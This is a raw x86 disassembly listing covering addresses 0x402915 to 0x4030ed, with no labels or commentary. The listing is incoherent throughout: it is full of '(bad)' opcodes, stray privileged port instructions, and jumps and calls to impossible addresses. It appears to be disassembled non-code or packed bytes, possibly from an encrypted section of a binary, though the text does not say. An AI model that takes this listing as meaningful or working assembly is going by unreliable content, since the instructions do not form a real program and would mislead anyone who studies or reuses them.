  402915:	and    ah,bl
  402917:	cmp    al,0x66
  402919:	mov    ecx,0x4d143b24
  40291e:	sti    
  40291f:	fnstenv [ecx+eax*4]
  402922:	(bad)  
  402923:	push   eax
  402924:	repz rcr DWORD PTR [ecx+0x36],0x3
  402929:	popf   
  40292a:	cmp    BYTE PTR [ebx+0x65],al
  40292d:	in     al,0x8d
  40292f:	and    bl,BYTE PTR [edi+0x649b34e3]
  402935:	mov    ecx,0x77189b90
  40293a:	or     BYTE PTR [ecx+edi*8],0xfe
  40293e:	push   ecx
  40293f:	jae    0x402934
  402941:	mov    gs,WORD PTR [esi-0x16]
  402944:	mov    dh,0x41
  402946:	in     al,0x5a
  402948:	test   edi,edx
  40294a:	stos   DWORD PTR es:[edi],eax
  40294b:	xor    eax,0x9f088c1
  402950:	xchg   ebx,eax
  402951:	pop    edi
  402952:	std    
  402953:	daa    
  402954:	add    DWORD PTR [ebp+0x673d15b8],ebx
  40295a:	aad    0xff
  40295c:	mov    bh,0xd8
  40295e:	lods   al,BYTE PTR ds:[esi]
  40295f:	mov    bl,0x53
  402961:	dec    ebp
  402962:	lods   al,BYTE PTR ds:[esi]
  402963:	lods   al,BYTE PTR ds:[esi]
  402964:	mov    bl,BYTE PTR [ebp*1+0x530b3b29]
  40296b:	add    bh,BYTE PTR [eax-0x6d42937b]
  402971:	mov    esi,0x96c13ff7
  402976:	cmp    al,0x96
  402978:	pop    bx
  40297a:	ds xor eax,0x7ab826c4
  402980:	mov    ah,0xa8
  402982:	pusha  
  402983:	lods   eax,DWORD PTR ds:[esi]
  402984:	or     esi,DWORD PTR [eax+esi*4+0x23]
  402988:	cmp    ecx,eax
  40298a:	inc    esi
  40298b:	jge    0x40297c
  40298d:	ret    
  40298e:	(bad)  
  40298f:	or     cl,BYTE PTR [ebp+eiz*2+0x74]
  402993:	clc    
  402994:	shr    BYTE PTR [edx],0xeb
  402997:	adc    al,0x8f
  402999:	rcl    DWORD PTR [ebp+0x53],1
  40299c:	sub    bh,al
  40299e:	or     BYTE PTR [ebx+0x8bb5603],dl
  4029a4:	lods   eax,DWORD PTR ds:[esi]
  4029a5:	mov    edi,0x95de922d
  4029aa:	aas    
  4029ab:	pop    ecx
  4029ac:	mov    bl,0x9c
  4029ae:	ds (bad) 
  4029b0:	jl     0x4029b0
  4029b2:	lods   al,BYTE PTR ds:[esi]
  4029b3:	pop    es
  4029b4:	sub    bh,0x9f
  4029b7:	loope  0x4029c4
  4029b9:	mov    al,ds:0x223d0608
  4029be:	fist   DWORD PTR [ecx-0x6de4aeea]
  4029c4:	fimul  DWORD PTR [edi+0x23]
  4029c7:	mov    ah,0xec
  4029c9:	sub    bl,0xd8
  4029cc:	xor    cl,BYTE PTR [edi+0x1d5a65d]
  4029d2:	xor    DWORD PTR ss:[esi-0x1b],ebx
  4029d6:	cli    
  4029d7:	std    
  4029d8:	sub    al,0x5c
  4029da:	adc    dl,dl
  4029dc:	push   eax
  4029dd:	pop    ds
  4029de:	leave  
  4029df:	mov    bh,0x7b
  4029e1:	es jno 0x402a3a
  4029e4:	scas   al,BYTE PTR es:[edi]
  4029e5:	ret    0xd2ef
  4029e8:	lea    ecx,[edx+0x599b7cf9]
  4029ee:	pop    esi
  4029ef:	into   
  4029f0:	stc    
  4029f1:	sub    bl,cl
  4029f3:	fild   DWORD PTR [ebx-0xf]
  4029f6:	stos   BYTE PTR es:[edi],al
  4029f7:	aad    0x9d
  4029f9:	and    DWORD PTR [esi+ecx*2],ebp
  4029fc:	adc    BYTE PTR ds:0xb1ded171,0x68
  402a03:	lds    edx,FWORD PTR [ebp-0x22]
  402a06:	das    
  402a07:	and    edi,DWORD PTR gs:[eax-0x63]
  402a0b:	jno    0x4029e6
  402a0d:	ja     0x402a69
  402a0f:	push   ecx
  402a10:	fwait
  402a11:	(bad)  
  402a12:	(bad)  
  402a13:	cmp    ch,dl
  402a15:	icebp  
  402a16:	out    0x69,eax
  402a18:	or     esi,ecx
  402a1a:	test   ecx,0x48f76107
  402a20:	pushf  
  402a21:	xchg   esp,eax
  402a22:	sbb    bh,BYTE PTR [ecx+0x49]
  402a25:	aad    0x32
  402a27:	in     al,0x8f
  402a29:	mul    edx
  402a2b:	cdq    
  402a2c:	and    al,BYTE PTR [ebp-0x3929c95b]
  402a32:	mov    es,eax
  402a34:	and    esi,DWORD PTR [ebx]
  402a36:	(bad)  
  402a37:	fstp   QWORD PTR [eax]
  402a39:	adc    esp,DWORD PTR [ebx+ebp*2-0x5c]
  402a3d:	bound  ecx,QWORD PTR [edi+0x10647297]
  402a43:	addr16 sahf 
  402a45:	sbb    al,0x50
  402a47:	push   es
  402a48:	retf   0x709c
  402a4b:	std    
  402a4c:	adc    BYTE PTR cs:[ebp+0x7602552c],dl
  402a53:	push   ss
  402a54:	cmp    eax,0x1d477391
  402a59:	clc    
  402a5a:	ds inc edx
  402a5c:	jmp    0x402a8c
  402a5e:	mov    eax,DWORD PTR [edi]
  402a60:	adc    al,0x9c
  402a62:	aam    0x3a
  402a64:	push   ebx
  402a65:	repz jmp 0xe309bb4f
  402a6b:	mov    bh,0x8c
  402a6d:	shl    DWORD PTR [eax+0x5a],cl
  402a70:	adc    bh,dh
  402a72:	rol    BYTE PTR [esi],1
  402a74:	xor    al,0x5e
  402a76:	mov    esp,0x1424d02a
  402a7b:	or     BYTE PTR [esi-0x61],ah
  402a7e:	call   0x653e67f2
  402a83:	cmp    bh,dl
  402a85:	cld    
  402a86:	(bad)  
  402a87:	xchg   edi,eax
  402a88:	xor    eax,0xf4e1d13
  402a8d:	push   edi
  402a8e:	stos   BYTE PTR es:[edi],al
  402a8f:	repnz ror BYTE PTR [esi-0xb],cl
  402a93:	mov    ecx,DWORD PTR [bp-0x7df8]
  402a98:	bound  eax,QWORD PTR [eax-0xb3e458]
  402a9e:	dec    ebp
  402a9f:	call   0xce0e6709
  402aa4:	adc    al,0xb1
  402aa6:	rol    BYTE PTR [eax],cl
  402aa8:	dec    edi
  402aa9:	mov    dl,0x9b
  402aab:	jmp    0x4080996
  402ab0:	add    eax,0x1eb58537
  402ab5:	clc    
  402ab6:	xchg   BYTE PTR [esi+edi*1-0x6dee59c5],ah
  402abd:	loopne 0x402b1b
  402abf:	push   0xf193b8b8
  402ac4:	xchg   BYTE PTR [edx-0x462817f7],bl
  402aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402acb:	fstp   DWORD PTR [ebx+0x6e42bdaf]
  402ad1:	mov    ds:0xc729d411,eax
  402ad6:	cmp    DWORD PTR [ebx-0x53],esp
  402ad9:	enter  0xb7fb,0x6f
  402add:	pop    esp
  402ade:	and    al,0xc4
  402ae0:	add    ch,dh
  402ae2:	ins    DWORD PTR es:[edi],dx
  402ae3:	jae    0x402b28
  402ae5:	rcl    BYTE PTR [eax+0x6],1
  402ae8:	sbb    ebp,DWORD PTR [edx+0x20]
  402aeb:	cmp    ebx,DWORD PTR [edx+0x1be52096]
  402af1:	ror    BYTE PTR [eax+0x7],cl
  402af4:	and    dl,ch
  402af6:	std    
  402af7:	sbb    DWORD PTR [edx+0x35],ecx
  402afa:	cmp    eax,0xc8765ecd
  402aff:	jmp    0xd6a47eaf
  402b04:	xor    ch,al
  402b06:	add    al,0xae
  402b08:	test   DWORD PTR [esi+0x55],ecx
  402b0b:	popa   
  402b0c:	mov    dl,0x4f
  402b0e:	mov    dh,0x3f
  402b10:	call   ebp
  402b12:	cmc    
  402b13:	icebp  
  402b14:	mov    eax,ds:0xde919352
  402b19:	and    esp,DWORD PTR [ebx-0x76]
  402b1c:	jb     0x402b18
  402b1e:	lock add DWORD PTR [edx+ebx*2],ecx
  402b22:	das    
  402b23:	fwait
  402b24:	out    dx,al
  402b25:	sub    BYTE PTR [eax-0xd2840bd],bh
  402b2b:	add    ebp,DWORD PTR [edi]
  402b2d:	xchg   esi,eax
  402b2e:	aaa    
  402b2f:	or     BYTE PTR [ebx-0x124bc567],bh
  402b35:	scas   al,BYTE PTR es:[edi]
  402b36:	dec    edi
  402b37:	sar    BYTE PTR [esi-0x51b1eb2f],cl
  402b3d:	ror    BYTE PTR [esi],1
  402b3f:	or     al,0x91
  402b41:	lds    ebp,FWORD PTR [esi]
  402b43:	jno    0x402b9e
  402b45:	lods   al,BYTE PTR ds:[esi]
  402b46:	in     al,dx
  402b47:	jns    0x402ad7
  402b49:	push   edi
  402b4a:	cwde   
  402b4b:	mov    BYTE PTR [esi-0x4e],ah
  402b4e:	stos   DWORD PTR es:[edi],eax
  402b4f:	push   ebp
  402b50:	pop    ss
  402b51:	push   ebp
  402b52:	das    
  402b53:	push   ebx
  402b54:	fwait
  402b55:	push   0x25
  402b57:	lock (bad) 
  402b59:	pop    ds
  402b5a:	sbb    al,0xf2
  402b5c:	mov    bh,dl
  402b5e:	in     eax,dx
  402b5f:	xor    BYTE PTR [eax-0x2e],ah
  402b62:	jle    0x402bd0
  402b64:	sbb    ebx,DWORD PTR [esi-0x6dbb2f5f]
  402b6a:	xchg   BYTE PTR [eax],bh
  402b6c:	enter  0x37d8,0xb7
  402b70:	retf   0x68d5
  402b73:	mov    ah,0xb9
  402b75:	or     eax,0x808961b3
  402b7a:	jge    0x402b81
  402b7c:	scas   eax,DWORD PTR es:[edi]
  402b7d:	jno    0x402bf2
  402b7f:	call   edx
  402b81:	xor    eax,0x9d0aa3b0
  402b86:	out    0x9e,al
  402b88:	lods   eax,DWORD PTR ds:[esi]
  402b89:	and    DWORD PTR [edi+0x72],0xff2fc1d8
  402b90:	sbb    ecx,ebp
  402b92:	jmp    0xcdfa:0x1e75c962
  402b99:	aaa    
  402b9a:	hlt    
  402b9b:	mov    WORD PTR [ecx],ds
  402b9d:	jo     0x402b68
  402b9f:	mov    dl,0xfc
  402ba1:	fs lock test esp,esi
  402ba5:	mov    ebx,0x6a31d1c2
  402baa:	pop    edi
  402bab:	ins    DWORD PTR es:[edi],dx
  402bac:	xchg   ebx,eax
  402bad:	xchg   ebx,eax
  402bae:	out    dx,eax
  402baf:	int3   
  402bb0:	jp     0x402bdc
  402bb2:	inc    ecx
  402bb3:	loop   0x402b39
  402bb5:	dec    esp
  402bb6:	mov    bx,0xba38
  402bba:	call   0xc61a:0x9e1a6587
  402bc1:	xchg   ebp,eax
  402bc2:	xor    al,0x29
  402bc4:	sahf   
  402bc5:	repnz push esi
  402bc7:	call   0x83d87e85
  402bcc:	push   esp
  402bcd:	or     BYTE PTR [esp+eiz*4],ah
  402bd0:	stos   DWORD PTR es:[edi],eax
  402bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bd2:	jp     0x402c1e
  402bd4:	cmp    DWORD PTR [edi+esi*2],eax
  402bd7:	fcomp  QWORD PTR ds:0xa70901c8
  402bdd:	test   DWORD PTR [ebx],ecx
  402bdf:	mov    ch,0x24
  402be1:	pop    edx
  402be2:	mov    ecx,ebp
  402be4:	test   al,0x1e
  402be6:	and    al,0x33
  402be8:	out    dx,al
  402be9:	retf   
  402bea:	aas    
  402beb:	xchg   ebx,eax
  402bec:	(bad)  
  402bed:	rcl    BYTE PTR [ecx+0xde182be],1
  402bf3:	or     eax,0xb4484b39
  402bf8:	loopne 0x402b8d
  402bfa:	push   ds
  402bfb:	pop    ebx
  402bfc:	push   0xffffff86
  402bfe:	jl     0x4923668e
  402c04:	(bad)  
  402c05:	mov    ebp,0x54c78952
  402c0a:	imul   eax,DWORD PTR [eax],0xffffffbc
  402c0d:	call   0x391ba710
  402c12:	mov    bl,BYTE PTR [edx+0x6f]
  402c15:	lds    ebp,FWORD PTR [ecx+ecx*2-0x23976ae5]
  402c1c:	imul   ecx,DWORD PTR [edi+0x35],0xffffffc7
  402c20:	sbb    al,0x45
  402c22:	test   eax,0x827a1ee4
  402c27:	push   0x34
  402c29:	mov    dl,0xe8
  402c2c:	push   esp
  402c2d:	in     eax,dx
  402c2e:	mov    edx,0x703c896e
  402c33:	sub    al,0x19
  402c35:	mov    cl,0x57
  402c37:	xor    ebp,ebx
  402c39:	add    BYTE PTR [esi+ebp*2-0x33fbc686],bh
  402c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c41:	mov    cl,0x11
  402c43:	and    cl,BYTE PTR [esi+0x75a06394]
  402c49:	sbb    DWORD PTR [edx+0x42],0xb
  402c4d:	clc    
  402c4e:	clc    
  402c4f:	or     BYTE PTR [ebx],bh
  402c51:	mov    esi,0xa3e847a5
  402c56:	sbb    DWORD PTR [edi],0xffffffc0
  402c59:	call   0xa774:0x634dff1c
  402c60:	and    eax,0xa91d0124
  402c65:	aad    0x4f
  402c67:	add    DWORD PTR [edx],esp
  402c69:	xchg   ebx,eax
  402c6a:	je     0x402c2a
  402c6c:	push   edx
  402c6d:	(bad)  
  402c6f:	adc    esp,ebp
  402c71:	add    eax,0x1f48bef
  402c76:	clc    
  402c77:	clc    
  402c78:	xchg   edx,eax
  402c79:	mov    edx,0x387c08b2
  402c7e:	clc    
  402c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c80:	jae    0x402c5f
  402c82:	jg     0x402cce
  402c84:	inc    esp
  402c85:	ret    
  402c86:	cs push ds
  402c88:	(bad)  
  402c89:	out    dx,al
  402c8a:	out    0x8d,eax
  402c8c:	xchg   edx,eax
  402c8d:	ja     0x402c93
  402c8f:	xchg   ebp,eax
  402c90:	iret   
  402c91:	xchg   ecx,eax
  402c92:	dec    edi
  402c93:	and    dl,BYTE PTR [eax-0x38d5ccb3]
  402c99:	xchg   ebx,eax
  402c9a:	int3   
  402c9b:	cmp    al,0xeb
  402c9d:	mov    ch,0x35
  402c9f:	cmp    BYTE PTR [eax],cl
  402ca1:	cmc    
  402ca2:	mov    ss,WORD PTR [si+0x3f6a]
  402ca7:	ja     0x402cd2
  402ca9:	jp     0x402c6e
  402cab:	test   BYTE PTR ss:[esi+0x2b102e4f],ah
  402cb2:	pop    edi
  402cb3:	mov    eax,ds:0xf662b444
  402cb8:	ror    DWORD PTR [eax],0xcf
  402cbb:	push   edi
  402cbc:	rcl    BYTE PTR [ebp+eiz*4+0x439790dd],0xd3
  402cc4:	loope  0x402d3c
  402cc6:	imul   ebp,DWORD PTR [ecx],0x353ffc90
  402ccc:	fisubr DWORD PTR [eax+edx*1+0x5f]
  402cd0:	or     DWORD PTR [ebx],ecx
  402cd2:	out    dx,eax
  402cd3:	xor    DWORD PTR [edx],ebx
  402cd5:	cmp    ecx,eax
  402cd7:	mul    BYTE PTR [ecx+0x53]
  402cda:	jecxz  0x402cb7
  402cdc:	jmp    0x990d8fba
  402ce1:	mov    ch,0x20
  402ce3:	mov    ebp,0x13e3cd9c
  402ce8:	leave  
  402ce9:	rcr    BYTE PTR ss:[edi-0x68],cl
  402ced:	imul   edi,DWORD PTR [esp+esi*2-0x654d5aa6],0xffffffa2
  402cf5:	ret    0xdb2f
  402cf8:	jae    0x402cb3
  402cfa:	les    esi,FWORD PTR [ecx+0x30]
  402cfd:	out    0xe4,al
  402cff:	adc    bh,BYTE PTR [ecx-0x594ad4b2]
  402d05:	mov    ds:0xcc318f3e,al
  402d0a:	je     0x402d65
  402d0c:	jmp    0x7bd5:0x56b8c05
  402d13:	mov    edx,0x833472c8
  402d18:	shl    BYTE PTR [ebp-0x75b52c43],1
  402d1e:	jbe    0x402d1d
  402d20:	gs test eax,0x369454f6
  402d26:	cmp    al,0xf1
  402d28:	repnz daa 
  402d2a:	xor    eax,edi
  402d2c:	sub    DWORD PTR [edi-0x7c],ebx
  402d2f:	lea    ebp,[ebx+eax*4-0x5]
  402d33:	xchg   BYTE PTR ds:0xe645c5ef,dl
  402d39:	cmp    esp,ebx
  402d3b:	add    cl,BYTE PTR [ecx+0x7d]
  402d3e:	dec    ebp
  402d3f:	jb     0x402d97
  402d41:	sub    BYTE PTR [ebx-0x68],cl
  402d44:	pop    edx
  402d45:	out    dx,al
  402d46:	loope  0x402db3
  402d48:	add    al,BYTE PTR [ecx+ecx*1]
  402d4b:	cmc    
  402d4c:	leave  
  402d4d:	mov    esi,0x7714fa5e
  402d52:	sbb    eax,0x49990f4d
  402d57:	or     DWORD PTR cs:[edi],0xe3a2949b
  402d5e:	sbb    BYTE PTR [ebx],bh
  402d60:	cld    
  402d61:	dec    ecx
  402d62:	mov    ebx,DWORD PTR [edx]
  402d64:	mov    edi,DWORD PTR [ebx-0x471b7070]
  402d6a:	push   cs
  402d6b:	leave  
  402d6c:	je     0x402dab
  402d6e:	aam    0x43
  402d70:	push   ecx
  402d71:	mov    al,0xe5
  402d73:	jb     0x402db9
  402d75:	cwde   
  402d76:	push   0xb798abe5
  402d7b:	push   esi
  402d7c:	test   DWORD PTR [ebx-0x629823bc],eax
  402d82:	loop   0x402dfd
  402d84:	imul   ebx,DWORD PTR [ecx-0x3842c8f7],0x904cebb
  402d8e:	ins    DWORD PTR es:[edi],dx
  402d8f:	push   edi
  402d90:	sub    al,0xa2
  402d92:	adc    DWORD PTR [ecx],ebp
  402d94:	and    BYTE PTR [ebp+edi*4+0x402ca992],cl
  402d9b:	add    dh,BYTE PTR [esi+0x63e8ebd0]
  402da1:	int    0xf5
  402da3:	adc    eax,0x6611117
  402da8:	test   ax,0xb611
  402dac:	sahf   
  402dad:	jg     0x402e25
  402daf:	stos   DWORD PTR es:[edi],eax
  402db0:	call   0xbf08:0x33a58da3
  402db7:	arpl   WORD PTR [eax-0x3890524d],bp
  402dbd:	mov    ds:0x8d2566cc,al
  402dc2:	push   ebp
  402dc3:	out    0xde,al
  402dc5:	ins    BYTE PTR es:[edi],dx
  402dc6:	pop    ds
  402dc7:	cmp    DWORD PTR [ebx-0x38407ad8],edx
  402dcd:	adc    eax,0xca37a764
  402dd2:	inc    esi
  402dd3:	les    edx,FWORD PTR [edx+0x54cb70b4]
  402dd9:	dec    ebx
  402dda:	gs test al,0x20
  402ddd:	jns    0x402e1d
  402ddf:	retf   
  402de0:	or     DWORD PTR [ecx],0xfbb24973
  402de6:	xor    dh,BYTE PTR [esi+0x6b]
  402de9:	je     0x402e46
  402deb:	cmp    DWORD PTR [eax],esp
  402ded:	dec    ebp
  402dee:	pusha  
  402def:	aaa    
  402df0:	sahf   
  402df1:	(bad)  
  402df3:	and    al,0xb2
  402df5:	xchg   edx,eax
  402df6:	cld    
  402df7:	fcom   DWORD PTR [ebx-0x5fa46302]
  402dfd:	retf   0xf22c
  402e00:	adc    bh,ch
  402e02:	add    al,0xaf
  402e04:	popa   
  402e05:	fwait
  402e06:	and    dh,BYTE PTR [ecx-0x48]
  402e09:	fcmovb st,st(1)
  402e0b:	pop    ecx
  402e0c:	test   eax,0x8e6c2318
  402e11:	sar    DWORD PTR [esi],cl
  402e13:	xor    DWORD PTR [esp+eiz*8+0x59fc32c5],esi
  402e1a:	leave  
  402e1b:	enter  0x12e3,0x71
  402e1f:	fnsave [eax]
  402e21:	out    dx,al
  402e22:	outs   dx,BYTE PTR ds:[esi]
  402e23:	xchg   ebx,eax
  402e24:	out    dx,al
  402e25:	xchg   ecx,eax
  402e26:	iret   
  402e27:	and    DWORD PTR [edi],ebx
  402e29:	mov    bl,BYTE PTR [ebx-0x4bafb30c]
  402e2f:	lahf   
  402e30:	rol    BYTE PTR [ebx+eiz*4+0x63],0xb
  402e35:	cmp    DWORD PTR [edx+0x22],0x2ea1d590
  402e3c:	int3   
  402e3d:	scas   al,BYTE PTR es:[edi]
  402e3e:	sbb    DWORD PTR [eax+0x7a674fea],ecx
  402e44:	xor    eax,0xc0a57165
  402e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e4a:	or     eax,DWORD PTR [esi]
  402e4c:	sub    BYTE PTR [esp+ebx*4-0x2eb00c5c],dl
  402e53:	and    dh,dl
  402e55:	aaa    
  402e56:	mul    DWORD PTR [esi-0x2a]
  402e59:	and    bh,cl
  402e5b:	pop    ds
  402e5c:	addr16 cmc 
  402e5e:	sub    ecx,DWORD PTR [eax-0x73def93c]
  402e64:	mov    cl,0x65
  402e66:	sar    edi,cl
  402e68:	daa    
  402e69:	push   0x465a14d8
  402e6e:	sub    al,0xf9
  402e70:	inc    esp
  402e71:	dec    edx
  402e72:	jmp    FWORD PTR [edi]
  402e74:	mov    ah,0xef
  402e76:	xchg   esi,eax
  402e77:	sub    DWORD PTR [eax-0x25],ebp
  402e7a:	sbb    ecx,DWORD PTR [ebx+0x4474ad27]
  402e80:	pop    edx
  402e81:	rol    BYTE PTR [eax+esi*1+0x712845e5],1
  402e88:	aaa    
  402e89:	ins    DWORD PTR es:[edi],dx
  402e8a:	xor    eax,0x5594fc78
  402e8f:	outs   dx,DWORD PTR ds:[esi]
  402e90:	mov    edx,0x73f6b02e
  402e95:	mov    eax,ebx
  402e97:	mov    cl,0x7e
  402e99:	in     al,0xb5
  402e9b:	loopne 0x402e71
  402e9d:	pop    esp
  402e9e:	push   edi
  402e9f:	repnz sub al,BYTE PTR [esp+edx*1]
  402ea3:	xchg   ebp,eax
  402ea4:	pop    ecx
  402ea5:	mov    dl,0x8a
  402ea7:	leave  
  402ea8:	add    eax,0x54b3a93f
  402ead:	repz cmp BYTE PTR [edi],ah
  402eb0:	pop    esp
  402eb1:	ret    
  402eb2:	inc    edx
  402eb3:	aad    0x2e
  402eb5:	inc    esp
  402eb6:	xchg   esp,eax
  402eb7:	and    ebp,DWORD PTR [ecx+0x680b24d4]
  402ebd:	xor    al,0xfe
  402ebf:	cli    
  402ec0:	fidivr WORD PTR [edi-0x31]
  402ec3:	dec    ebx
  402ec4:	aad    0x3c
  402ec6:	xchg   edx,eax
  402ec7:	or     eax,0x5478761e
  402ecc:	jbe    0x402e4f
  402ece:	shl    DWORD PTR [edx-0x30],1
  402ed1:	add    DWORD PTR [edx-0xc],0x54989197
  402ed8:	in     eax,dx
  402ed9:	cmp    DWORD PTR [ecx],ecx
  402edb:	aad    0xe6
  402edd:	dec    esp
  402ede:	pop    ecx
  402edf:	nop
  402ee0:	mov    WORD PTR [esi-0x4],?
  402ee3:	sbb    eax,0x2818807
  402ee8:	pop    es
  402ee9:	sub    eax,DWORD PTR [edi+0xc]
  402eec:	fs (bad) 
  402eee:	add    al,0x6a
  402ef0:	mov    bl,BYTE PTR [ebx+0x609ae41]
  402ef6:	pop    edi
  402ef7:	outs   dx,BYTE PTR ds:[esi]
  402ef8:	sbb    cl,dh
  402efa:	cmc    
  402efb:	push   esp
  402efc:	shl    esp,1
  402efe:	icebp  
  402eff:	sub    eax,0x9af20727
  402f04:	ja     0x402f24
  402f06:	dec    ecx
  402f07:	sbb    al,0x6d
  402f09:	ret    0x5337
  402f0c:	mov    BYTE PTR [ebx-0x2468ad0a],dh
  402f12:	jp     0x402f08
  402f14:	in     eax,dx
  402f15:	dec    ebx
  402f16:	rcl    BYTE PTR [esi-0x526d9ce4],cl
  402f1c:	scas   al,BYTE PTR es:[edi]
  402f1d:	jns    0x402f75
  402f1f:	mov    al,ds:0xd0829e8a
  402f24:	xchg   esp,edx
  402f26:	test   DWORD PTR [ebp+ecx*4-0x4c],edi
  402f2a:	pop    ds
  402f2b:	push   0x2a
  402f2d:	imul   edi,DWORD PTR [ecx],0x21
  402f30:	test   DWORD PTR [esi-0xc47c386],ecx
  402f36:	mov    eax,ds:0x6a794d5b
  402f3b:	rol    esp,cl
  402f3d:	mov    eax,ds:0x3db92047
  402f42:	jo     0x402fb3
  402f44:	fst    DWORD PTR [ebx-0x2a]
  402f47:	pop    ebx
  402f48:	xor    bl,BYTE PTR [eax-0x28cce724]
  402f4e:	and    ebx,eax
  402f50:	add    DWORD PTR [edi+0x5c69c27c],0xffffffeb
  402f57:	gs (bad) 
  402f59:	mov    al,0xbf
  402f5b:	ja     0x402fb8
  402f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f5e:	stc    
  402f5f:	into   
  402f60:	shl    BYTE PTR [edi],1
  402f62:	mov    bh,0xd
  402f64:	adc    eax,ebx
  402f66:	adc    eax,0x4c96b95e
  402f6b:	shl    al,cl
  402f6d:	xchg   esi,eax
  402f6e:	adc    ah,cl
  402f70:	cmc    
  402f71:	popf   
  402f72:	test   eax,0x22b8b174
  402f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f78:	mov    dh,0x3a
  402f7a:	add    BYTE PTR [ebp+0x59],0x83
  402f7e:	xlat   BYTE PTR ds:[ebx]
  402f7f:	mov    edi,0xed44efdf
  402f84:	cs sahf 
  402f86:	cmp    dl,BYTE PTR [ebx-0x3e]
  402f89:	sbb    ch,bh
  402f8b:	jbe    0x402f5c
  402f8d:	fstp   TBYTE PTR [ecx+0x23]
  402f90:	mov    eax,DWORD PTR [esi-0x3685daf5]
  402f96:	test   BYTE PTR [edx],cl
  402f98:	fwait
  402f99:	adc    esp,DWORD PTR [esi]
  402f9b:	push   0x54
  402f9d:	add    al,0x34
  402f9f:	sbb    DWORD PTR [ecx+esi*2],0xffffffd4
  402fa3:	xchg   edx,eax
  402fa4:	pop    ecx
  402fa5:	ret    0xc1ca
  402fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fa9:	jb     0x402fb2
  402fab:	jmp    0x402f5d
  402fad:	inc    ecx
  402fae:	stos   DWORD PTR es:[edi],eax
  402faf:	div    DWORD PTR [edx-0x8]
  402fb2:	mov    edx,0x353206b3
  402fb7:	xchg   ecx,eax
  402fb8:	mov    ds:0x7adb78e8,eax
  402fbd:	fsubr  st(7),st
  402fbf:	add    BYTE PTR [esp+eiz*8],cl
  402fc2:	jg     0x402f90
  402fc4:	xchg   edi,eax
  402fc5:	push   ds
  402fc6:	pop    ss
  402fc7:	push   cs
  402fc8:	mov    ch,0x44
  402fca:	lock push ss
  402fcc:	xor    edi,DWORD PTR [esi]
  402fce:	(bad)  
  402fcf:	aas    
  402fd0:	cs (bad) 
  402fd2:	in     al,dx
  402fd3:	in     eax,dx
  402fd4:	lds    ecx,FWORD PTR [edx]
  402fd6:	or     DWORD PTR [ecx+0x6a],edi
  402fd9:	add    al,0x96
  402fdb:	data16 test BYTE PTR [esi-0x61a3bba3],ch
  402fe2:	jb     0x402feb
  402fe4:	bound  esp,QWORD PTR [esi]
  402fe6:	jl     0x402f8a
  402fe8:	inc    ebp
  402fe9:	loopne 0x40301c
  402feb:	fdivp  st(6),st
  402fed:	and    eax,0x33440d58
  402ff2:	enter  0xc302,0xd5
  402ff6:	jecxz  0x402f9b
  402ff8:	retf   0xc797
  402ffb:	push   ss
  402ffc:	inc    edi
  402ffd:	adc    BYTE PTR [ebx-0x38af0a68],bh
  403003:	test   DWORD PTR [edx],edi
  403005:	jo     0x402fed
  403007:	das    
  403008:	fs sbb al,0x7a
  40300b:	out    dx,eax
  40300c:	popa   
  40300d:	lods   al,BYTE PTR ds:[esi]
  40300e:	xor    al,0xa3
  403010:	xor    BYTE PTR [edx],0xb0
  403013:	int    0xf6
  403015:	imul   esi,DWORD PTR [ecx],0xa69f0fef
  40301b:	(bad)  
  40301c:	mov    ebx,0x2d5b1256
  403021:	push   eax
  403022:	(bad)  
  403023:	out    dx,eax
  403024:	or     al,0x47
  403026:	cmp    al,0x10
  403028:	fist   DWORD PTR [edi+0x15]
  40302b:	int3   
  40302c:	mov    dh,0x11
  40302e:	mov    cl,cl
  403030:	mov    ebp,0x996a2633
  403035:	retf   0x7cf3
  403038:	dec    ebx
  403039:	enter  0x4ab3,0x66
  40303d:	outs   dx,DWORD PTR ds:[esi]
  40303e:	add    al,0x24
  403040:	and    DWORD PTR [ebx+ebp*4-0x53b62e7c],0xb987cd06
  40304b:	and    eax,0xae248c67
  403050:	enter  0xbc88,0xc
  403054:	out    dx,al
  403055:	cmc    
  403056:	bound  edx,QWORD PTR [ebx]
  403058:	gs shl ebp,0xf
  40305c:	int3   
  40305d:	xor    eax,0xe81758ed
  403062:	cdq    
  403063:	mov    bl,0xd1
  403065:	data16 mov cl,0x3
  403068:	or     al,0xb3
  40306a:	xchg   ecx,eax
  40306b:	sbb    BYTE PTR [edi+edi*8+0x5a],dl
  40306f:	ds pop es
  403071:	addr16 add eax,0xbc99e9d6
  403077:	or     eax,0xb23ec5c7
  40307c:	loop   0x403036
  40307e:	jle    0x403062
  403080:	cs out dx,eax
  403082:	dec    esp
  403083:	lea    ebx,[esi]
  403085:	js     0x4030b2
  403087:	fnsave [edi]
  403089:	aad    0x95
  40308b:	test   DWORD PTR [edx-0x60],esp
  40308e:	nop
  40308f:	addr16 je 0x403086
  403092:	dec    edx
  403093:	xor    al,0x9e
  403095:	nop
  403096:	cmp    esp,DWORD PTR [ecx+ecx*4]
  403099:	jno    0x4030fc
  40309b:	mov    ebp,0xfc7d4d48
  4030a0:	fs pusha 
  4030a2:	xor    al,0x19
  4030a4:	jge    0x4030fd
  4030a6:	retf   0x7cc8
  4030a9:	rcr    DWORD PTR fs:[ebx],0x62
  4030ad:	(bad)  [ebx+0x7a]
  4030b0:	shl    eax,1
  4030b2:	inc    esi
  4030b3:	mov    DWORD PTR [eax-0x1264d924],eax
  4030b9:	shr    DWORD PTR [eax],cl
  4030bb:	es sub eax,0x8a60c937
  4030c1:	mov    edi,0xc75f90c6
  4030c6:	xchg   esp,eax
  4030c7:	cmc    
  4030c8:	das    
  4030c9:	mov    ds:0x206ae7e5,al
  4030ce:	xchg   esp,eax
  4030cf:	cwde   
  4030d0:	arpl   WORD PTR [bx+di+0x46],cx
  4030d4:	xchg   edx,eax
  4030d5:	shl    BYTE PTR [ecx-0x5af1fc9e],cl
  4030db:	xchg   edi,eax
  4030dc:	pushf  
  4030dd:	sbb    eax,DWORD PTR [edi-0x67]
  4030e0:	pushf  
  4030e1:	ss lock jno 0x4030f4
  4030e5:	ret    0x1957
  4030e8:	sub    eax,0xd68717c5
  4030ed:	pop    edi
